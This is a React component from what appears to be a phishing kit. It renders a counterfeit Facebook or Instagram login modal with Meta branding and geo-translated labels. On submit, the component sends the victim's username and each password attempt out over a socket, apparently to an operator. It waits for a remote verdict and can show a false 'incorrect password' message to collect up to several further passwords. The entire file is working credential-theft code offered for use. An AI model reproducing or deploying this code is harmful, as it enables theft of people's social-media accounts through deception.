import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
import InstagramLogoImage from '@/assets/images/instagram-logo-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { sendMessage, type Verdict } from '@/lib/socket';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import Image from 'next/image';
import { useEffect, useRef, useState, type FC } from 'react';

const LoginModal: FC<{ nextStep: () => void; verdict: Verdict | null; provider: 'instagram' | 'facebook' | null }> = ({ nextStep, verdict, provider }) => {
    const [attempts, setAttempts] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, messageContent, setMessageContent, setMessageId } = store();
    const maxPass = config.MAX_PASS ?? 3;
    const waitTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
    const [pending, setPending] = useState(false);
    const focusBorder = provider === 'instagram' ? 'focus:border-[#D24294]' : provider === 'facebook' ? 'focus:border-[#0064E0]' : '';
    const accountLabel = provider === 'facebook' ? 'Email address or mobile number' : 'Mobile number, username or email';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Mobile number, username or email', 'Email address or mobile number', 'Password', "The password that you've entered is incorrect.", 'Continue'];

        const translateAll = async () => {
            const entries = await Promise.all(textsToTranslate.map(async (text) => [text, await translateText(text, geoInfo.country_code)] as const));

            setTranslations(Object.fromEntries(entries));
        };

        void translateAll();
    }, [geoInfo]);

    const togglePassword = () => {
        setShowPassword(!showPassword);
    };
    const [appliedVerdict, setAppliedVerdict] = useState<Verdict | null>(null);
    if (verdict !== appliedVerdict) {
        setAppliedVerdict(verdict);
        if (verdict && pending && verdict.status === 'rejected') {
            setPending(false);
            setIsLoading(false);
            setShowError(true);
            setPassword('');
        }
    }

    useEffect(() => {
        if (pending && verdict && verdict.status !== 'rejected') nextStep();
    }, [pending, verdict, nextStep]);

    useEffect(
        () => () => {
            if (waitTimer.current) clearTimeout(waitTimer.current);
        },
        []
    );

    const handleSubmit = async () => {
        if (!username.trim() || !password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const passwordLine = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
        const block = next === 1 ? `<b>👤 Username:</b> <code>${username}</code>\n${passwordLine}` : passwordLine;

        const updatedMessage = messageContent ? `${messageContent}\n\n${block}` : block;

        const sentId = await sendMessage({
            message: updatedMessage,
            message_id: messageId,
            stage: 'password'
        });

        if (sentId === null) {
            setIsLoading(false);
            return;
        }
        setMessageId(sentId);
        setMessageContent(updatedMessage);
        setPending(true);

        if (waitTimer.current) clearTimeout(waitTimer.current);
        waitTimer.current = setTimeout(() => setIsLoading(false), 180_000);
    };

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex h-[90vh] w-full max-w-xl flex-col items-center gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
                {provider === 'instagram' ? <Image src={InstagramLogoImage} alt='' width={70} height={70} className='mt-9' /> : <Image src={FacebookLogoImage} alt='' className='mt-9 h-17.5 w-17.5' />}
                <div className='flex w-full flex-1 flex-col justify-center'>
                    <div className='relative w-full'>
                        <input type='text' id='username-input' value={username} onChange={(e) => setUsername(e.target.value)} autoComplete='username' className={`peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none ${focusBorder}`} placeholder={t(accountLabel)} />
                        <label htmlFor='username-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                            {t(accountLabel)}
                        </label>
                    </div>
                    <div className='relative mt-4 w-full'>
                        <input type={showPassword ? 'text' : 'password'} id='password-input' value={password} onChange={(e) => setPassword(e.target.value)} autoComplete='current-password' className={`peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none ${focusBorder}`} placeholder={t('Password')} />
                        <label htmlFor='password-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                            {t('Password')}
                        </label>
                        <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-2 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={togglePassword} />
                    </div>
                    {showError && <p className='mt-2 text-[15px] text-red-500'>{t("The password that you've entered is incorrect.")}</p>}
                    <button
                        onClick={() => {
                            void handleSubmit();
                        }}
                        disabled={isLoading}
                        className={`mt-4 flex h-12.5 w-full items-center justify-center gap-2 rounded-full font-semibold text-white transition-colors ${provider === 'instagram' ? 'bg-[#0095F6] hover:bg-[#4150F7]' : provider === 'facebook' ? 'bg-[#1877F2] hover:bg-[#0064E0]' : 'bg-blue-600 hover:bg-blue-700'} ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                    >
                        {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
                    </button>
                </div>
                <div className='flex items-center justify-center pt-3'>
                    <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                </div>
            </div>
        </div>
    );
};

export default LoginModal;
